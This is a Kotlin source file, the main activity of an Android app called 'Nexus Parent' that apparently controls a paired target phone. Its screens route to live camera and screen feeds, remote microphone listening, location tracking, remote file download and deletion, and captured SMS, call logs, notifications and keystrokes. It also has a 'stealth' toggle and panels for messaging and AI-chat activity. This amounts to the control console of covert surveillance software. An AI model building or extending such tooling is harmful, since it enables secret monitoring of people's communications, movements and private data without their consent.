package com.nexus.parent

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.DocumentsContract
import android.view.WindowManager
import androidx.activity.ComponentActivity
import androidx.activity.SystemBarStyle
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.nexus.parent.data.PendingDocumentExportRequest
import com.nexus.parent.data.storage.PendingStorageDownloadRequest
import com.nexus.parent.state.ConnectionPhase
import com.nexus.parent.state.FeatureId
import com.nexus.parent.state.FeatureTarget
import com.nexus.parent.state.MonitoringState
import com.nexus.parent.state.ParentStateHolder
import com.nexus.parent.state.ParentUiState
import com.nexus.parent.webrtc.VideoFeedType
import com.nexus.parent.ui.components.ActiveCallBanner
import com.nexus.parent.ui.components.TacticalToastHost
import com.nexus.parent.ui.home.ConnectedDashboardScreen
import com.nexus.parent.ui.home.PairingScreen
import com.nexus.parent.ui.monitor.MonitorHostScreen
import com.nexus.parent.ui.monitor.applock.AppLockPanel
import com.nexus.parent.ui.monitor.calllog.CallLogPanel
import com.nexus.parent.ui.monitor.keyboard.KeyboardPanel
import com.nexus.parent.ui.monitor.notifications.NotificationsPanel
import com.nexus.parent.ui.monitor.sms.SmsPanel
import com.nexus.parent.ui.monitor.staged.StagedActivityPanel
import com.nexus.parent.ui.monitor.vibrateflash.VibrateFlashPanel
import com.nexus.parent.ui.monitor.wallpaper.WallpaperPanel
import com.nexus.parent.ui.monitor.wellbeing.WellbeingPanel
import com.nexus.parent.ui.settings.SettingsScreen
import com.nexus.parent.ui.shell.LeftDrawerContent
import com.nexus.parent.ui.shell.PushDrawerScaffold
import com.nexus.parent.ui.shell.TopCapsuleBar
import com.nexus.parent.ui.stealth.StealthDialogsHost
import com.nexus.parent.ui.surveillance.camera.CameraFeedScreen
import com.nexus.parent.ui.surveillance.location.LocationScreen
import com.nexus.parent.ui.surveillance.mic.FloatingMicOverlay
import com.nexus.parent.ui.surveillance.screen.ScreenFeedScreen
import com.nexus.parent.ui.surveillance.storage.StorageScreen
import com.nexus.parent.ui.theme.NexusColors
import com.nexus.parent.ui.theme.NexusParentTheme
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.StateFlow
import org.webrtc.EglBase
import org.webrtc.VideoTrack

/**
 * MainActivity.kt - Single-Activity Compose entry point for Nexus Parent Android.
 *
 * Hey friend! Here is how the entire UI shell fits together:
 * 1. `PushDrawerScaffold` implements the legacy ChatGPT-style push drawer with swipe-anywhere support.
 * 2. `TopCapsuleBar` renders the floating three-capsule toolbar above the active viewport.
 * 3. `MainContentRouter` switches cleanly between Phase 1 Pairing, Phase 2 Connected Dashboard,
 *    full-viewport Surveillance Feeds, and Monitor/Control Panels.
 * 4. `FloatingMicOverlay`, `ActiveCallBanner`, `TacticalToastHost`, `StealthDialogsHost`, and
 *    `SettingsScreen` layer cleanly above everything with zero SurfaceView window-hole blockers.
 */
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge(
            statusBarStyle = SystemBarStyle.dark(Color.TRANSPARENT),
            navigationBarStyle = SystemBarStyle.dark(Color.BLACK)
        )
        setContent {
            val app = application as? NexusParentApplication
            val stateHolder = remember(app) { app?.stateHolder ?: ParentStateHolder() }
            val videoTrackFlow = remember(app) {
                app?.coordinator?.webRtcManager?.activeVideoTrack ?: MutableStateFlow<VideoTrack?>(null)
            }
            val pendingExportFlow = remember(app) {
                app?.coordinator?.surveillanceCoordinator?.pendingExportRequests
                    ?: MutableSharedFlow<PendingDocumentExportRequest>()
            }
            val pendingStorageDownloadFlow = remember(app) {
                app?.coordinator?.storageCoordinator?.pendingDownloadRequests
                    ?: MutableSharedFlow<PendingStorageDownloadRequest>()
            }
            val recordAudioPermissionFlow = remember(app) {
                app?.coordinator?.micCoordinator?.recordAudioPermissionRequests
                    ?: MutableSharedFlow<Unit>()
            }
            val eglContext = remember(app) { app?.coordinator?.getEglBaseContext() }

            LaunchedEffect(app) {
                app?.coordinator?.runStartupAutoConnect()
            }

            NexusParentTheme {
                NexusParentRoot(
                    stateHolder = stateHolder,
                    videoTrackFlow = videoTrackFlow,
                    pendingExportFlow = pendingExportFlow,
                    pendingStorageDownloadFlow = pendingStorageDownloadFlow,
                    recordAudioPermissionFlow = recordAudioPermissionFlow,
                    eglContext = eglContext,
                    hasLiveCoordinator = app != null
                )
            }
        }
    }
}

@Composable
fun NexusParentRoot(
    stateHolder: ParentStateHolder,
    videoTrackFlow: StateFlow<VideoTrack?> = remember { MutableStateFlow(null) },
    pendingExportFlow: SharedFlow<PendingDocumentExportRequest> = remember { MutableSharedFlow() },
    pendingStorageDownloadFlow: SharedFlow<PendingStorageDownloadRequest> = remember { MutableSharedFlow() },
    recordAudioPermissionFlow: SharedFlow<Unit> = remember { MutableSharedFlow() },
    eglContext: EglBase.Context? = null,
    hasLiveCoordinator: Boolean = false
) {
    val state by stateHolder.uiState.collectAsStateWithLifecycle()
    val activeVideoTrack by videoTrackFlow.collectAsStateWithLifecycle()
    val context = LocalContext.current

    val notificationPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (!granted) {
            stateHolder.showToast("Notification permission helps keep background WebRTC status visible.")
        }
    }

    val recordAudioPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { granted ->
        stateHolder.onRecordAudioPermissionResult(granted)
    }

    LaunchedEffect(recordAudioPermissionFlow) {
        recordAudioPermissionFlow.collect {
            recordAudioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
        }
    }

    val wallpaperPickerLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.PickVisualMedia()
    ) { uri ->
        if (uri != null) {
            stateHolder.pushWallpaperFromUri(uri)
        }
    }

    val saveClipDocumentLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val uri = if (result.resultCode == Activity.RESULT_OK) result.data?.data else null
        stateHolder.completeCreateDocumentExport(uri)
    }

    LaunchedEffect(pendingExportFlow) {
        pendingExportFlow.collect { req ->
            val createIntent = Intent(Intent.ACTION_CREATE_DOCUMENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = req.mimeType
                putExtra(Intent.EXTRA_TITLE, req.fileName)
            }
            saveClipDocumentLauncher.launch(createIntent)
        }
    }

    val saveStorageDocumentLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val uri = if (result.resultCode == Activity.RESULT_OK) result.data?.data else null
        stateHolder.completeStorageDownloadPick(uri)
    }

    val browseDownloadsFolderLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.OpenDocumentTree()
    ) { uri ->
        if (uri != null) {
            runCatching {
                context.contentResolver.takePersistableUriPermission(
                    uri,
                    Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                )
            }
            val label = formatSafTreeLabel(uri)
            stateHolder.updateSettings {
                it.copy(
                    downloadsTreeUri = uri.toString(),
                    downloadsDirectoryLabel = label
                )
            }
            stateHolder.showToast("Downloads folder set to: $label")
        }
    }

    LaunchedEffect(pendingStorageDownloadFlow) {
        pendingStorageDownloadFlow.collect { req ->
            val createIntent = Intent(Intent.ACTION_CREATE_DOCUMENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = req.mimeType
                putExtra(Intent.EXTRA_TITLE, req.fileName)
            }
            saveStorageDocumentLauncher.launch(createIntent)
        }
    }

    val requestNotificationsIfNeeded: () -> Unit = {
        if (hasLiveCoordinator && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val granted = ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
            if (!granted) {
                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    // Keep screen awake whenever connected, connecting, or reconnecting (matching Desktop keepScreenAwake)
    val shouldKeepAwake = state.settings.keepScreenAwake && state.connectionPhase in setOf(
        ConnectionPhase.CONNECTING,
        ConnectionPhase.CONNECTED,
        ConnectionPhase.RECONNECTING
    )
    DisposableEffect(shouldKeepAwake, context) {
        val window = (context as? Activity)?.window
        if (shouldKeepAwake) {
            window?.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        } else {
            window?.clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        }
        onDispose {
            window?.clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        }
    }

    // Auto-dismiss transient toast notifications after 2.6 seconds
    LaunchedEffect(state.toastMessage) {
        if (state.toastMessage != null) {
            delay(2600)
            stateHolder.clearToast()
        }
    }

    // Back press exits active feature back to Dashboard before closing the app
    BackHandler(enabled = state.activeFeature != null && !state.isDrawerOpen && !state.isSettingsOpen) {
        stateHolder.closeActiveFeature()
    }

    val isVideoFullscreen =
        (state.activeFeature == FeatureId.CAMERA && state.camera.isFullscreen) ||
            (state.activeFeature == FeatureId.SCREEN && state.screen.isFullscreen)

    PushDrawerScaffold(
        isDrawerOpen = state.isDrawerOpen,
        onDrawerOpenChange = stateHolder::setDrawerOpen,
        swipeEnabled = !isVideoFullscreen,
        edgeOnlySwipe = state.activeFeature == FeatureId.LOCATION,
        drawerContent = {
            LeftDrawerContent(
                state = state,
                onPairOrDeviceButtonClick = {
                    if (state.connectionPhase == ConnectionPhase.CONNECTED ||
                        state.connectionPhase == ConnectionPhase.RECONNECTING
                    ) {
                        stateHolder.toggleDevicePopover()
                    } else {
                        stateHolder.closeActiveFeature()
                        stateHolder.setDrawerOpen(false)
                    }
                },
                onDisconnectClick = stateHolder::disconnectDevice,
                onCancelReconnectClick = stateHolder::cancelReconnection,
                onRetryReconnectNowClick = stateHolder::retryReconnectNow,
                onSearchQueryChange = stateHolder::setDrawerSearchQuery,
                onToggleSection = stateHolder::toggleSectionCollapsed,
                onSelectFeature = stateHolder::selectFeature,
                onStealthClick = stateHolder::onStealthButtonClicked,
                onSettingsClick = { stateHolder.openSettings() }
            )
        },
        mainContent = {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(NexusColors.CanvasBlack)
            ) {
                // 1. Primary Main Viewport Router
                MainContentRouter(
                    state = state,
                    stateHolder = stateHolder,
                    activeVideoTrack = activeVideoTrack,
                    eglContext = eglContext,
                    onBeforeConnect = requestNotificationsIfNeeded,
                    onPickWallpaperClick = {
                        if (hasLiveCoordinator && state.connectionPhase != ConnectionPhase.CONNECTED) {
                            stateHolder.showToast("Cannot push: DataChannel not connected")
                        } else if (hasLiveCoordinator) {
                            wallpaperPickerLauncher.launch(
                                PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly)
                            )
                        } else {
                            stateHolder.showToast("Select an image once WebRTC link is active")
                        }
                    }
                )

                // 2. Floating Three-Capsule Top Toolbar (hidden in fullscreen video mode)
                if (!isVideoFullscreen) {
                    TopCapsuleBar(
                        activeFeature = state.activeFeature,
                        connectionPhase = state.connectionPhase,
                        isMicLive = state.mic.listenState == MonitoringState.LIVE,
                        isMicOverlayOpen = state.mic.isOverlayOpen,
                        isActiveFeatureLive = state.activeFeature != null && state.activeFeature in state.liveFeatures,
                        onMenuClick = stateHolder::toggleDrawer,
                        onCloseFeature = stateHolder::closeActiveFeature,
                        onMicClick = { stateHolder.selectFeature(FeatureId.MIC) },
                        onSettingsClick = { stateHolder.openSettings() },
                        modifier = Modifier
                            .align(Alignment.TopCenter)
                            .statusBarsPadding()
                    )
                }

                // 3. Compact Floating Draggable Microphone HUD
                FloatingMicOverlay(
                    state = state.mic,
                    onClose = { stateHolder.setMicOverlayOpen(false) },
                    onToggleListen = stateHolder::toggleMicListen,
                    onToggleSpeak = {
                        val hasAudioPerm = !hasLiveCoordinator ||
                            ContextCompat.checkSelfPermission(
                                context,
                                Manifest.permission.RECORD_AUDIO
                            ) == PackageManager.PERMISSION_GRANTED
                        stateHolder.toggleMicSpeak(hasAudioPerm)
                    },
                    onToggleVoiceMenu = stateHolder::toggleVoiceMenu,
                    onSelectVoice = stateHolder::selectVoicePreset
                )

                // 4. Floating Active Cellular Call Alert Banner
                ActiveCallBanner(
                    alert = state.activeCallAlert,
                    onTurnOnMic = stateHolder::acceptCallAlertAndListenMic,
                    onDismiss = stateHolder::dismissCallAlert,
                    modifier = Modifier
                        .align(Alignment.TopCenter)
                        .statusBarsPadding()
                        .padding(top = 64.dp)
                )

                // 5. Global Floating Feedback Toast
                TacticalToastHost(
                    message = state.toastMessage,
                    modifier = Modifier
                        .align(Alignment.BottomCenter)
                        .navigationBarsPadding()
                        .padding(bottom = 86.dp)
                )
            }
        }
    )

    // Modals: Stealth Confirmation & 5-Tab Settings Console
    StealthDialogsHost(
        showConfirmDialog = state.showStealthConfirmDialog,
        showNotConnectedDialog = state.showStealthNotConnectedDialog,
        currentStatus = state.stealthStatus,
        onConfirmToggle = stateHolder::confirmStealthToggle,
        onDismiss = stateHolder::dismissStealthDialogs
    )

    SettingsScreen(
        state = state,
        onSelectTab = stateHolder::selectSettingsTab,
        onUpdateSettings = stateHolder::updateSettings,
        onBrowseDownloadsFolder = {
            if (hasLiveCoordinator) {
                browseDownloadsFolderLauncher.launch(null)
            } else {
                stateHolder.showToast("Folder picker requires active Android runtime")
            }
        },
        onSelectPairedDevice = stateHolder::selectPairedDevice,
        onClearSelectedPairedDevice = stateHolder::clearSelectedPairedDevice,
        onConnectPairedDevice = { targetId ->
            requestNotificationsIfNeeded()
            stateHolder.connectToDevice(targetId, fromHistoryId = targetId)
        },
        onDisconnectDevice = stateHolder::disconnectDevice,
        onCancelReconnect = stateHolder::cancelReconnection,
        onResetDefaults = stateHolder::resetSettingsToDefaults,
        onClearWorkspaceHistory = stateHolder::clearWorkspaceHistory,
        onDismiss = stateHolder::closeSettings
    )
}

@Composable
private fun MainContentRouter(
    state: ParentUiState,
    stateHolder: ParentStateHolder,
    activeVideoTrack: VideoTrack?,
    eglContext: EglBase.Context?,
    onBeforeConnect: () -> Unit,
    onPickWallpaperClick: () -> Unit
) {
    val active = state.activeFeature
    if (active == null) {
        if (state.connectionPhase == ConnectionPhase.CONNECTED ||
            state.connectionPhase == ConnectionPhase.RECONNECTING
        ) {
            ConnectedDashboardScreen(
                device = state.connectedDevice ?: state.lastPairedDevice,
                onOpenDrawerClick = { stateHolder.setDrawerOpen(true) }
            )
        } else {
            PairingScreen(
                digits = state.pairingInputDigits,
                statusMessage = state.pairingStatusMessage,
                errorMessage = state.pairingErrorMessage,
                lastPairedDevice = state.lastPairedDevice,
                isConnecting = state.connectionPhase == ConnectionPhase.CONNECTING && state.connectingFromHistoryId == null,
                connectingProgress = state.connectingProgressMessage,
                onDigitsChange = stateHolder::updatePairingDigits,
                onClearDigits = stateHolder::clearPairingDigits,
                onConnectClick = {
                    onBeforeConnect()
                    stateHolder.connectToDevice()
                },
                onQuickConnectRecent = { rawId ->
                    onBeforeConnect()
                    stateHolder.connectToDevice(rawId)
                }
            )
        }
        return
    }

    when (active) {
        FeatureId.CAMERA -> CameraFeedScreen(
            state = state.camera,
            onPlayPauseClick = stateHolder::toggleCameraStream,
            onRotateClick = stateHolder::rotateCameraFeed,
            onSwitchLensClick = stateHolder::toggleCameraLens,
            onScrubDvr = stateHolder::scrubCameraDvr,
            onJumpToLive = stateHolder::jumpCameraToLive,
            onSaveClipClick = stateHolder::exportCameraDvrClip,
            onToggleFullscreen = stateHolder::toggleCameraFullscreen,
            videoTrack = if (state.camera.state == MonitoringState.LIVE) activeVideoTrack else null,
            eglContext = eglContext,
            onDvrSegmentPositionMs = { posMs -> stateHolder.onDvrSegmentPosition(VideoFeedType.CAMERA, posMs) },
            onDvrSegmentCompleted = { stateHolder.onDvrSegmentCompleted(VideoFeedType.CAMERA) }
        )
        FeatureId.SCREEN -> ScreenFeedScreen(
            state = state.screen,
            onPlayPauseClick = stateHolder::toggleScreenStream,
            onRotateClick = stateHolder::rotateScreenFeed,
            onScrubDvr = stateHolder::scrubScreenDvr,
            onJumpToLive = stateHolder::jumpScreenToLive,
            onSaveClipClick = stateHolder::exportScreenDvrClip,
            onToggleFullscreen = stateHolder::toggleScreenFullscreen,
            videoTrack = if (state.screen.state == MonitoringState.LIVE) activeVideoTrack else null,
            eglContext = eglContext,
            onToggleSystemAudio = stateHolder::toggleSystemAudio,
            onDvrSegmentPositionMs = { posMs -> stateHolder.onDvrSegmentPosition(VideoFeedType.SCREEN, posMs) },
            onDvrSegmentCompleted = { stateHolder.onDvrSegmentCompleted(VideoFeedType.SCREEN) }
        )
        FeatureId.LOCATION -> LocationScreen(
            state = state.location,
            onToggleTracking = stateHolder::toggleLocationTracking,
            onCenterTarget = stateHolder::centerLocationTarget,
            onToggleLayer = stateHolder::toggleMapLayer,
            onZoomIn = stateHolder::zoomLocationIn,
            onZoomOut = stateHolder::zoomLocationOut
        )
        FeatureId.STORAGE -> StorageScreen(
            state = state.storage,
            onRefreshClick = stateHolder::refreshStorageDirectory,
            onParentDirClick = stateHolder::navigateStorageUp,
            onBreadcrumbClick = stateHolder::navigateStorageBreadcrumb,
            onSearchChange = stateHolder::setStorageSearchQuery,
            onSelectCategory = stateHolder::selectStorageCategory,
            onOpenDirectory = stateHolder::openStorageDirectory,
            onSelectItem = stateHolder::selectStorageItem,
            onLoadMoreClick = stateHolder::loadMoreStorageFiles,
            onLoadFullImage = stateHolder::loadStorageImagePreview,
            onCloseImagePreview = stateHolder::closeStorageImagePreview,
            onDownloadPreviewedImage = stateHolder::downloadPreviewedStorageImage,
            onDownloadItem = stateHolder::requestStorageDownload,
            onRequestDelete = stateHolder::requestStorageDeleteConfirmation,
            onDismissDeleteConfirm = stateHolder::dismissStorageDeleteConfirmation,
            onConfirmDelete = stateHolder::confirmStorageDelete,
            onCancelTransfer = stateHolder::cancelStorageTransfer
        )
        FeatureId.MIC -> {
            // Mic renders as a persistent floating overlay rather than replacing the main viewport
            ConnectedDashboardScreen(
                device = state.connectedDevice ?: state.lastPairedDevice,
                onOpenDrawerClick = { stateHolder.setDrawerOpen(true) }
            )
        }
        else -> {
            val monitoringState = when (active) {
                FeatureId.SMS -> state.monitor.smsState
                FeatureId.CALLLOG -> state.monitor.callLogState
                FeatureId.NOTIFICATION -> state.monitor.notificationState
                FeatureId.KEYBOARD -> state.monitor.keyboardState
                FeatureId.WELLBEING -> state.monitor.wellbeing.monitoringState
                FeatureId.APPLOCK -> state.monitor.appLock.monitoringState
                FeatureId.WALLPAPER -> state.monitor.wallpaper.monitoringState
                else -> MonitoringState.IDLE
            }
            val showDock = active != FeatureId.VIBRATEFLASH && active.target != FeatureTarget.STAGED_PANEL

            MonitorHostScreen(
                monitoringState = monitoringState,
                featureTitle = active.title,
                showPlayPauseDock = showDock,
                onToggleMonitoring = { stateHolder.toggleMonitorPanelPlayPause(active) }
            ) {
                when (active) {
                    FeatureId.SMS -> SmsPanel(
                        monitoringState = state.monitor.smsState,
                        searchQuery = state.monitor.smsSearchQuery,
                        items = state.monitor.smsItems,
                        selectedSms = state.monitor.selectedSms,
                        onSearchChange = stateHolder::setSmsSearchQuery,
                        onSelectSms = stateHolder::selectSmsItem
                    )
                    FeatureId.CALLLOG -> CallLogPanel(
                        monitoringState = state.monitor.callLogState,
                        activeFilter = state.monitor.callFilter,
                        expandedCallId = state.monitor.expandedCallId,
                        items = state.monitor.callItems,
                        onSelectFilter = stateHolder::setCallFilter,
                        onToggleExpand = stateHolder::toggleExpandedCall
                    )
                    FeatureId.NOTIFICATION -> NotificationsPanel(
                        monitoringState = state.monitor.notificationState,
                        searchQuery = state.monitor.notificationSearchQuery,
                        activeFilter = state.monitor.notificationFilter,
                        items = state.monitor.notificationItems,
                        selectedNotification = state.monitor.selectedNotification,
                        onSearchChange = stateHolder::setNotificationSearchQuery,
                        onSelectFilter = stateHolder::setNotificationFilter,
                        onSelectNotification = stateHolder::selectNotificationItem
                    )
                    FeatureId.KEYBOARD -> KeyboardPanel(
                        monitoringState = state.monitor.keyboardState,
                        searchQuery = state.monitor.keyboardSearchQuery,
                        items = state.monitor.keyboardItems,
                        onSearchChange = stateHolder::setKeyboardSearchQuery,
                        onClearAll = stateHolder::clearKeyboardRecords
                    )
                    FeatureId.WELLBEING -> WellbeingPanel(
                        state = state.monitor.wellbeing,
                        onSelectRange = stateHolder::setWellbeingRange,
                        onRefreshClick = stateHolder::refreshWellbeing,
                        onSearchChange = stateHolder::setWellbeingSearchQuery,
                        onSelectCategory = stateHolder::setWellbeingCategory
                    )
                    FeatureId.APPLOCK -> AppLockPanel(
                        state = state.monitor.appLock,
                        onToggleRemoteLock = stateHolder::toggleRemoteAppLock,
                        onOpenChangePin = { stateHolder.setChangePinDialogVisible(true) },
                        onDismissChangePin = { stateHolder.setChangePinDialogVisible(false) },
                        onConfirmNewPin = stateHolder::confirmNewAppLockPin,
                        onClearAttempts = stateHolder::clearAppLockRecords,
                        onSearchChange = stateHolder::setAppLockSearchQuery,
                        onSelectSelfiePreview = stateHolder::setSelfiePreviewAttempt
                    )
                    FeatureId.VIBRATEFLASH -> VibrateFlashPanel(
                        state = state.monitor.vibrateFlash,
                        onVibrateClick = stateHolder::triggerVibrate,
                        onFlashClick = stateHolder::triggerFlash,
                        onCombinedClick = stateHolder::triggerCombined
                    )
                    FeatureId.WALLPAPER -> WallpaperPanel(
                        state = state.monitor.wallpaper,
                        onPreviewTap = stateHolder::requestWallpaperPreview,
                        onSelectTarget = stateHolder::setWallpaperTarget,
                        onPushWallpaperClick = onPickWallpaperClick
                    )
                    FeatureId.WHATSAPP,
                    FeatureId.TELEGRAM,
                    FeatureId.CHATGPT,
                    FeatureId.CLAUDE,
                    FeatureId.GROK -> StagedActivityPanel(feature = active)
                    else -> Unit
                }
            }
        }
    }
}

private fun formatSafTreeLabel(uri: Uri): String {
    val docId = runCatching { DocumentsContract.getTreeDocumentId(uri) }.getOrNull().orEmpty()
    if (docId.startsWith("primary:")) {
        val rel = docId.removePrefix("primary:").trim('/')
        return if (rel.isEmpty()) "Internal Storage" else "Internal/$rel"
    }
    if (docId.isNotBlank()) {
        return docId.replace(':', '/')
    }
    return uri.lastPathSegment?.takeIf { it.isNotBlank() } ?: "Custom Folder"
}
